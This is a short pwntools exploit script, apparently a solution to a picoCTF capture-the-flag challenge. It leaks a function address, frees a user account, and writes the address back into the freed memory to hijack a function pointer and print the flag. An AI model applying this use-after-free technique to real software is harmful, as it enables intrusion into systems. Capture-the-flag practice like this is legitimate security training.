from pwn import * 

Local = False

if Local : 
	p = process("./gottaadmit") 
else : 
	p=remote('mercury.picoctf.net',61817) 

def Createaccount(p) :
	p.sendline(b"M")
	p.recvuntil(b"username: \n")

def printMenu(p) : 
	p.recvuntil(b"xit\n") 

def leak(p) : 
	p.sendline(b"S") 
	return p.recvline()
printMenu(p)
Createaccount(p)
p.sendline(b"johny was a good men")
printMenu(p)


dawa_dawa = str(leak(p) , "utf-8")
log.info("leaked address : "+dawa_dawa)
dawa_dawa = dawa_dawa[21:-1]
win = p32(int(dawa_dawa,16)) + b"a"*4

## deleting account 
p.sendline(b"I")

p.recvuntil(b"N)?\n")
p.sendline(b"Y") 
log.info("User deleted") 
p.recvline()

## putting target address 
log.info("putting function pointer in target ")

p.sendline(b"l")
p.recvuntil(b"try anyways:\n")

p.sendline(win)
## getting flag
print(p.recvline())
